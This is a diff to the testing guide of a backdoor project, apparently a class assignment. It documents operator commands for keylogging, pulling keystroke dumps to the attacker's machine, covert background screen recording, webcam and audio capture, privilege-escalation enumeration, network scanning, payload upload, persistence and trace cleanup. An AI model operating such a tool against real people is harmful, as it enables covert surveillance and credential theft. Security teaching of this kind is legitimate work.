@@ -78,7 +78,11 @@ pip3 install -r requirements.txt
 - `Pillow` - For screenshot capture
 - `pyautogui` - For screen automation
 - `pyaudio` - For audio recording
-- `opencv-python` - For webcam capture
+- `opencv-python` - For webcam capture and video encoding
+- `numpy` - For screen recording (array operations)
+- `mss` - For fast screen capture in recordings
+- `imageio` - For video file creation
+- `imageio-ffmpeg` - For ffmpeg codec support
 
 **Note:** If you're building executables, the `build_executable.py` script will automatically install these requirements for you.
 
@@ -112,7 +116,17 @@ pip3 install pynput Pillow pyautogui opencv-python
 pip3 install pynput              # Keylogger
 pip3 install Pillow pyautogui    # Screenshots
 pip3 install pyaudio             # Audio recording (requires portaudio system library)
+pip3 install opencv-python numpy mss imageio imageio-ffmpeg  # Screen recording
 pip3 install opencv-python       # Webcam capture
+
+# For best screen recording performance, install ffmpeg:
+# macOS:
+brew install ffmpeg
+# Ubuntu/Debian:
+sudo apt-get install ffmpeg
+# Fedora/CentOS:
+sudo dnf install ffmpeg
+# Windows: Download from ffmpeg.org and add to PATH
 ```
 
 #### 1.3 Prepare Target Package
@@ -323,6 +337,56 @@ Release: 5.15.0
 
 ### Phase 5: Testing Features
 
+#### Quick Command Reference
+
+**Screen & Media Capture:**
+| Command | Description | Example |
+|---------|-------------|---------|
+| `screenshot` | Capture single screenshot | `screenshot` |
+| `screenshot_multi <count> <interval>` | Multiple screenshots | `screenshot_multi 5 2` |
+| `screenshot_list` | List all screenshots | `screenshot_list` |
+| `record_screen <duration> <fps>` | Record screen (timed) | `record_screen 30 15` |
+| `record_start <max_duration>` | Start background recording | `record_start 3600` |
+| `record_stop` | Stop background recording | `record_stop` |
+| `record_status` | Check recording status | `record_status` |
+| `record_list` | List all recordings | `record_list` |
+| `audio_record <seconds>` | Record audio | `audio_record 10` |
+| `audio_list` | List audio recordings | `audio_list` |
+| `webcam_snap` | Capture webcam image | `webcam_snap` |
+
+**Keylogger:**
+| Command | Description | Example |
+|---------|-------------|---------|
+| `keylog_start` | Start keylogger | `keylog_start` |
+| `keylog_stop` | Stop keylogger | `keylog_stop` |
+| `keylog_dump` | Download keylog file (auto-saved as keylog_dump_TIMESTAMP.txt) | `keylog_dump` |
+| `keylog_status` | Check keylogger status | `keylog_status` |
+| `keylog_clear` | Clear keylog file | `keylog_clear` |
+
+**Privilege & System:**
+| Command | Description | Example |
+|---------|-------------|---------|
+| `priv_check` | Check current privileges | `priv_check` |
+| `priv_enum` | Enumerate escalation vectors | `priv_enum` |
+| `priv_services` | List running services | `priv_services` |
+| `sysinfo` | Display system information | `sysinfo` |
+
+**Network:**
+| Command | Description | Example |
+|---------|-------------|---------|
+| `net_info` | Display network info | `net_info` |
+| `net_scan` | Scan local network | `net_scan` |
+| `net_connections` | Show active connections | `net_connections` |
+| `net_public_ip` | Get public IP | `net_public_ip` |
+
+**File Operations:**
+| Command | Description | Example |
+|---------|-------------|---------|
+| `download <file>` | Download file from target | `download logs/keylog.txt` |
+| `upload <file>` | Upload file to target | `upload payload.exe` |
+
+---
+
 #### Test Basic Commands
 
 ```
@@ -407,13 +471,33 @@ Shows:
 - Buffer size
 - File size
 
-##### View Captured Keystrokes
+##### View and Download Captured Keystrokes
 
 ```
 keylog_dump
 ```
 
-Displays all captured keystrokes with timestamps
+**What happens:**
+
+1. Saves any buffered keystrokes to the log file
+2. Automatically downloads the log file to your attacker machine
+3. Saves as `keylog_dump_YYYYMMDD_HHMMSS.txt` with timestamp
+4. Displays the content in the terminal
+
+**Output example:**
+
+```
+[*] Downloading keylog file...
+[+] Keylog file downloaded: keylog_dump_20251004_143022.txt
+
+=== Keylog Content ===
+[2025-10-04 14:25:12] Hello World
+[2025-10-04 14:26:45] password123
+[2025-10-04 14:27:10] username@email.com
+=== End of Keylog ===
+```
+
+**Note:** The downloaded file is saved in the same directory where you run `server.py`
 
 ##### Stop Keylogger
 
@@ -451,11 +535,25 @@ Deletes the log file and clears the buffer
 
 ###### Log File Format
 
+**On Target Machine (logs/keylog/keylog.txt):**
+
 ```
 [2025-10-03 14:30:22] Hello World
 [2025-10-03 14:30:45] This is a test
 [2025-10-03 14:31:10] password123[ENTER]
 ```
+
+**On Attacker Machine (after keylog_dump):**
+
+- File saved as: `keylog_dump_20251004_143022.txt`
+- Location: Same directory where `server.py` is running
+- Content: Identical to the target's log file with all timestamps preserved
+
+**File Management:**
+
+- Each `keylog_dump` creates a new file with unique timestamp
+- Old dumps are preserved (not overwritten)
+- Can be analyzed later or transferred securely
 
 #### Test Privilege Escalation
 
@@ -554,6 +652,202 @@ Available screenshots:
 - screenshot_20251003_143000.png
 - screenshot_20241002_120000.png
 ```
+
+#### Test Screen Recording
+
+**Basic Timed Recording:**
+
+```
+record_screen 10 15
+```
+
+Records screen for 10 seconds at 15 fps (frames per second)
+
+Response: Screen recording saved with timestamp and file size
+
+##### How It Works
+
+1. **record_screen <duration> <fps>**: Records the screen for specified duration at given frame rate
+2. Uses multiple recording methods with automatic fallback:
+   - OpenCV + PIL/pyautogui (cross-platform)
+   - MSS + imageio (faster performance)
+   - ffmpeg system commands (best quality)
+   - Screenshot sequence (fallback)
+3. Video saved as MP4 in logs/recordings/
+
+##### Output Example
+
+```
+[+] Screen recording saved: logs/recordings/screen_recording_20251003_150000.mp4 (150 frames, 25.4 MB)
+```
+
+**Quick Recording (defaults):**
+
+```
+record_screen
+```
+
+Records for 10 seconds at 15 fps (default settings)
+
+**High Quality Recording:**
+
+```
+record_screen 30 30
+```
+
+Records for 30 seconds at 30 fps for smoother video
+
+**Low File Size Recording:**
+
+```
+record_screen 20 10
+```
+
+Records for 20 seconds at 10 fps for smaller file size
+
+**Background Recording:**
+
+Start a background recording that continues until manually stopped:
+
+```
+record_start
+```
+
+Starts recording with max duration of 1 hour (default)
+
+```
+record_start 600
+```
+
+Starts recording with max duration of 600 seconds (10 minutes)
+
+Response: Background recording started with filepath
+
+##### Check Recording Status
+
+```
+record_status
+```
+
+Shows current recording status and filepath if recording is active
+
+Response: "Recording in progress: logs/recordings/screen_recording_20251003_150000.mp4" or "No active recording"
+
+##### Stop Background Recording
+
+```
+record_stop
+```
+
+Stops the current background recording and finalizes the video file
+
+Response: Recording stopped message with final file size
+
+##### List All Recordings
+
+```
+record_list
+```
+
+Shows: List of all screen recordings with file sizes
+
+##### Output Example
+
+```
+Available recordings:
+screen_recording_20251003_150000.mp4 (25.4 MB)
+screen_recording_20251003_143022.mp4 (45.8 MB)
+screen_recording_20251002_120000.mp4 (15.2 MB)
+```
+
+##### Download Recording
+
+```
+download logs/recordings/screen_recording_20251003_150000.mp4
+```
+
+Downloads the specified video recording file
+
+##### Complete Workflow Example
+
+```
+# Start background recording
+> record_start 1800
+
+[+] Background recording started: logs/recordings/screen_recording_20251003_150000.mp4
+
+# Check status after some time
+> record_status
+
+Recording in progress: logs/recordings/screen_recording_20251003_150000.mp4
+
+# Stop when done
+> record_stop
+
+[+] Recording stopped and saved: logs/recordings/screen_recording_20251003_150000.mp4 (125.8 MB)
+
+# List all recordings
+> record_list
+
+Available recordings:
+screen_recording_20251003_150000.mp4 (125.8 MB)
+screen_recording_20251003_143000.mp4 (45.2 MB)
+
+# Download the recording
+> download logs/recordings/screen_recording_20251003_150000.mp4
+
+[+] Downloading file...
+[+] Download complete
+```
+
+##### Frame Rate Guidelines
+
+- **10 fps**: Small file size, acceptable for monitoring (~3-5 MB/min at 720p)
+- **15 fps**: Default, good balance between quality and size (~4-8 MB/min at 720p)
+- **24 fps**: Smooth playback, cinematic quality (~6-12 MB/min at 720p)
+- **30 fps**: High quality, larger files (~8-15 MB/min at 720p)
+
+##### Troubleshooting Screen Recording
+
+**If recording fails:**
+
+1. Install required dependencies:
+
+   ```bash
+   pip3 install opencv-python numpy mss imageio imageio-ffmpeg
+   ```
+
+2. For best performance, install ffmpeg:
+
+   ```bash
+   # macOS
+   brew install ffmpeg
+
+   # Ubuntu/Debian
+   sudo apt-get install ffmpeg
+
+   # Fedora/CentOS
+   sudo dnf install ffmpeg
+   ```
+
+3. Test recording manually:
+
+   ```bash
+   python3 test_screen_recording.py quick
+   ```
+
+4. Check permissions:
+   - macOS: System Preferences > Security & Privacy > Privacy > Screen Recording
+   - Linux: Ensure X11 display access
+   - Windows: Run with administrator privileges if needed
+
+**Common Issues:**
+
+- **"No module named 'cv2'"**: Install opencv-python
+- **"No module named 'mss'"**: Install mss and imageio
+- **Slow/choppy recording**: Lower FPS or install ffmpeg
+- **Large file sizes**: Use lower FPS (10-15) or shorter duration
+- **Black screen**: Check screen recording permissions
 
 #### Test Webcam Capture
 
@@ -861,6 +1155,68 @@ arecord -d 3 test.wav && aplay test.wav
 arecord -l  # List all capture devices
 ```
 
+### Issue 8: Screen Recording Not Working
+
+```bash
+# Install required Python packages
+pip3 install opencv-python numpy mss imageio imageio-ffmpeg
+
+# For best performance and quality, install ffmpeg system-wide:
+# macOS:
+brew install ffmpeg
+
+# Ubuntu/Debian:
+sudo apt-get update
+sudo apt-get install -y ffmpeg
+
+# Fedora/CentOS/RHEL:
+sudo dnf install -y ffmpeg
+
+# Arch Linux:
+sudo pacman -S ffmpeg
+
+# Windows:
+# Download from https://ffmpeg.org/download.html
+# Extract and add to PATH
+
+# Test if ffmpeg is installed:
+ffmpeg -version
+
+# macOS: Grant screen recording permissions
+# System Preferences > Security & Privacy > Privacy > Screen Recording
+# Add Terminal or Python to allowed apps
+
+# Linux: Ensure X11 display is accessible
+echo $DISPLAY  # Should show :0 or similar
+export DISPLAY=:0
+
+# Test screen recording manually:
+cd /tmp/DES484_Backdoor
+python3 test_screen_recording.py quick
+
+# If recording is slow/choppy:
+# - Use lower FPS: record_screen 10 10
+# - Close resource-intensive applications
+# - Install ffmpeg for better performance
+
+# If files are too large:
+# - Use lower FPS: record_screen 30 10
+# - Use shorter durations
+# - Ensure ffmpeg is installed for better compression
+
+# If getting black screen:
+# - Check screen recording permissions (macOS)
+# - Ensure display is not locked
+# - Try different recording method by installing different packages
+
+# Common error messages:
+# "No module named 'cv2'" -> pip3 install opencv-python
+# "No module named 'mss'" -> pip3 install mss
+# "No module named 'imageio'" -> pip3 install imageio imageio-ffmpeg
+# "No module named 'numpy'" -> pip3 install numpy
+# "Recording failed - ffmpeg may not be installed" -> Install ffmpeg (see above)
+```
+
 ## 📊 Testing Checklist
 
 - [ ] Attacker listener starts successfully
@@ -872,6 +1228,10 @@ arecord -l  # List all capture devices
 - [ ] Keylogger starts and captures keystrokes
 - [ ] Privilege escalation enumeration works
 - [ ] Screenshot capture works
+- [ ] Screen recording works (timed and background)
+- [ ] Screen recording file size is reasonable
+- [ ] Recording status check works
+- [ ] Recording list displays all videos
 - [ ] Webcam capture works
 - [ ] Audio recording works
 - [ ] Network discovery functions
@@ -889,11 +1249,12 @@ For your class presentation:
 3. **Showcase keylogger** - Type in notepad, show capture
 4. **Show privilege escalation** - Enumerate vectors
 5. **Demonstrate screen capture** - Take and download screenshot
-6. **Network discovery demo** - Scan network, find hosts
-7. **Persistence demo** - Install, reboot, reconnect
-8. **Discuss detections** - How it could be detected
-9. **Show cleanup** - Remove all traces
-10. **Ethical considerations** - Legal usage only
+6. **Demo screen recording** - Record activity, show video playback
+7. **Network discovery demo** - Scan network, find hosts
+8. **Persistence demo** - Install, reboot, reconnect
+9. **Discuss detections** - How it could be detected
+10. **Show cleanup** - Remove all traces
+11. **Ethical considerations** - Legal usage only
 
 ## 🔐 Security Notes
 
